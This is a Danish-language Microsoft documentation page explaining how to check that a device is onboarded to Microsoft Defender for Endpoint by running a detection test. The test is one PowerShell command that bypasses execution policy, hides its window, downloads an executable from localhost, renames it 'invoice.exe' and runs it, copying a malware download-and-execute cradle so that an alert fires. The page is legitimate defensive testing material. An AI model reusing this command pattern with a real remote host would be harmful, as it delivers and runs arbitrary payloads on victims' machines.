---
title: Kør en registreringstest på en enhed for at bekræfte, at den er blevet installeret korrekt Microsoft Defender for Endpoint
description: Kør registreringstestscriptet på en enhed, der for nylig er onboardet til Microsoft Defender for Endpoint for at bekræfte, at den er tilføjet korrekt.
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365-initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 1d8459633d00d759fda1584e0084cd8ed4e12633
ms.sourcegitcommit: b0c3ffd7ddee9b30fab85047a71a31483b5c649b
ms.translationtype: MT
ms.contentlocale: da-DK
ms.lasthandoff: 03/25/2022
ms.locfileid: "64477253"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Kør en registreringstest på en nyligt onboardet Microsoft Defender for Endpoint enhed

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Gælder for:**
- Windows 11
- Understøttede Windows 10 versioner
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, version 1803
- Windows Server 2019
- Windows Server 2022
- [Microsoft Defender for Endpoint plan 2](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Vil du gerne Microsoft Defender for Endpoint? [Tilmeld dig for at få en gratis prøveversion.](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)

Når du føjer en enhed til Microsoft Defender for Endpoint administration, kaldes det også onboardingenheder. Onboarding gør det muligt for enheder at rapportere signaler om deres tilstand til tjenesten.

At sikre, eller bekræfte, at en enhed er blevet føjet til tjenesten, er et vigtigt trin i hele installationsprocessen. Den forsikrer dig om, at alle de forventede enheder administreres. 

## <a name="verify-microsoft-defender-for-endpoint-onboarding-of-a-device-using-a-powershell-detection-test"></a>Bekræft Microsoft Defender for Endpoint onboarding af en enhed ved hjælp af en registreringstest af PowerShell

Kør følgende PowerShell-script på en nyligt onboardet enhed for at bekræfte, at den rapporterer korrekt til Defender for Endpoint-tjenesten.

1. Opret en mappe: 'C:\test-MDATP-test'.
2. Åbn en kommandoprompt med administrator på enheden, og kør scriptet:

   1. Gå til **Start,** og skriv **cmd**.

   1. Højreklik på **Kommandoprompt,** og **vælg Kør som administrator**.

      :::image type="content" source="images/run-as-admin.png" alt-text="Den menuen Start peger på Kør som administrator" lightbox="images/run-as-admin.png":::
    
3. Når du bliver bedt om det, skal du kopiere og køre følgende kommando:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

Vinduet Kommandoprompt lukkes automatisk. Hvis det lykkes, vises der en ny besked i portalen for den onboardede enhed om ca. ti minutter.

## <a name="related-topics"></a>Relaterede emner

- [Onboard Windows-enheder](configure-endpoints.md)
- [Onboard-servere](configure-server-endpoints.md)
- [Fejlfinding Microsoft Defender for Endpoint onboardingproblemer](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
